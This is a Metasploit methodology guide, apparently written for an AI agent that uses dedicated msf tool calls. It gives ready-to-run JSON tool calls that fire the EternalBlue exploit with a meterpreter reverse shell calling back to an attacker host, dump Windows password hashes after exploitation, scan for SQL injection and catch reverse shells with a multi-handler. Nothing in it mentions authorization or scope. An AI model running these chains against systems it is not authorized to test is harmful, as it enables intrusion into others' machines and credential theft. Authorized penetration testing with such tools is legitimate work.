# Metasploit Framework Methodology

This document provides a methodology for using Metasploit via the dedicated tool interface (`msf_check`, `msf_command`, `msf_run`, `msf_sessions`). These tools connect to a running `msfrpcd` daemon for structured responses, or fall back to `msfconsole -q -x` when RPC is unavailable.

---

## 1. Verify Availability

Before using any Metasploit tools, always check if the framework is reachable:

```
{"tool": "msf_check", "args": {}}
```

This probes RPC first, then `msfconsole` as fallback. The response tells you which mode is active.

---

## 2. Search for Modules

Use `msf_command` to search for relevant exploits, auxiliaries, or payloads:

```
{"tool": "msf_command", "args": {"cmd": "search eternalblue"}}
{"tool": "msf_command", "args": {"cmd": "search type:exploit platform:windows cve:2021"}}
{"tool": "msf_command", "args": {"cmd": "search type:auxiliary name:scan"}}
```

Typical search patterns:
- `search <cve-id>` — find modules for a specific CVE
- `search type:exploit <platform> <keyword>` — filter by platform+keyword
- `search type:auxiliary scanner` — find scanner modules

After finding a module, inspect its options:

```
{"tool": "msf_command", "args": {"cmd": "info exploit/windows/smb/ms17_010_eternalblue"}}
```

---

## 3. Execute a Module

### Exploit modules (require a payload)

```
{"tool": "msf_run", "args": {"module": "exploit/windows/smb/ms17_010_eternalblue", "payload": "windows/x64/meterpreter/reverse_tcp", "options": {"RHOSTS": "192.168.1.100", "LHOST": "10.0.0.5", "LPORT": "4444"}}}
```

### Auxiliary modules (no payload needed)

```
{"tool": "msf_run", "args": {"module": "auxiliary/scanner/portscan/tcp", "options": {"RHOSTS": "192.168.1.0/24", "PORTS": "80,443,3306"}}}
{"tool": "msf_run", "args": {"module": "auxiliary/scanner/http/sql_injection", "options": {"RHOSTS": "192.168.1.100", "TARGETURI": "/search.php"}}}
```

### Post-exploitation modules

```
{"tool": "msf_run", "args": {"module": "post/windows/gather/hashdump", "options": {"SESSION": 1}}}
{"tool": "msf_run", "args": {"module": "post/linux/gather/checkvm", "options": {"SESSION": 1}}}
```

---

## 4. Manage Sessions

After a successful exploit, list and interact with sessions:

```
{"tool": "msf_sessions", "args": {"action": "list"}}
```

Read output from a specific session:

```
{"tool": "msf_sessions", "args": {"action": "interact", "id": 1}}
```

Kill a session when done:

```
{"tool": "msf_sessions", "args": {"action": "kill", "id": 1}}
```

---

## 5. Common Workflows

### SMB Exploitation Chain
1. `msf_command` — `search ms17_010` to find eternalblue module
2. `msf_run` — configure and fire with `windows/x64/meterpreter/reverse_tcp`
3. `msf_sessions list` — confirm session opened
4. `msf_run` — run `post/windows/gather/hashdump` on session 1
5. `msf_sessions kill 1` — clean up

### Web App Recon Chain
1. `msf_run` — `auxiliary/scanner/http/http_version` on target
2. `msf_run` — `auxiliary/scanner/http/robots_txt` on target
3. `msf_run` — `auxiliary/scanner/http/sql_injection` on target forms
4. If SQLi found, chain with `exploit/multi/http/xxx` as appropriate

### Multi-Handler Listener (reverse shell catch)
1. `msf_run` with `exploit/multi/handler`, payload `windows/meterpreter/reverse_tcp`, set `LHOST` + `LPORT`
2. Use `execute_terminal` or `http_request` to trigger the reverse shell from the target
3. `msf_sessions list` to catch the incoming session

---

## 6. Fallback Mode (No RPC)

When `msf_check` reports console fallback mode, the tools still work but with limitations:

- **msf_command** runs `msfconsole -q -x "cmd" -o output.txt` — same commands but text-only output
- **msf_run** writes a `.rc` resource script and runs it — works for module execution
- **msf_sessions list/kill** work via console commands; **interact** requires RPC

To enable RPC mode, start `msfrpcd`:
```
msfrpcd -P your_password -S
```
Then set `metasploit_rpc_password` in the Suijin config via Settings.

---

## 7. Important Notes

- Always verify the module path is correct — Metasploit is case-sensitive for module names
- For reverse payloads, ensure `LHOST` is reachable from the target
- Some exploit modules require `check` before `run` — use `msf_command` with `check` first if needed
- Session IDs increment; track them after each successful exploit
- The `-j` (job) flag is automatically appended to keep modules running in background
